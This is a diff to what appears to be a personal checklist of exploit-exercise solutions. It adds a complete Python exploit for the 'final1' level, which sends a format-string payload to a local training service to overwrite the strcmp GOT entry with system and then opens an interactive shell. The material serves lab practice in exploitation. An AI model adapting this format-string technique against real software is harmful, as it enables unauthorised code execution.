@@ -86,7 +86,53 @@ t = telnetlib.Telnet()
 t.sock = s
 t.interact()
 ```
-- [ ] final1
+- [x] final1
+```
+import struct
+import socket
+import telnetlib
+
+HOST='127.0.0.1'
+PORT=2994
+
+
+def read_until(check):
+    buffer=''
+    while check not in buffer:
+        buffer += s.recv(1)
+    return buffer
+
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((HOST,PORT))
+
+# GOT -> 0x804a1b4
+# system offset -> 0xb7ecffb0
+
+strcmp = struct.pack("I",0x804a1a8)
+strcmp2 = struct.pack("I",0x804a1a8+2)
+ip,port = s.getsockname()
+
+hostname = ip+":"+str(port)
+padding_a = "A"*(24-len(hostname))
+
+username = padding_a+'BBBB'+strcmp+'DDDD'+strcmp2+'%17$65399x %18$08n %19$47162x %20$08n'
+#username = padding_a + 'BBBB' + strcmp + '%17$65407x %18$08nAA' + strcmp2 + '%22$47157x %24$04n'
+
+password="CCCC"
+
+print read_until("[final1] $ ")
+raw_input('Waiting for input..')
+s.send("username "+username+"\n")
+print read_until("[final1] $ ")
+s.send("login "+password+"\n")
+print read_until("[final1] $ ")
+raw_input('Waiting for input..')
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+```
 - [ ] final2
 
 ## Create a Binary with no stack canary, executable stack and no PIE (Position Independent Code)
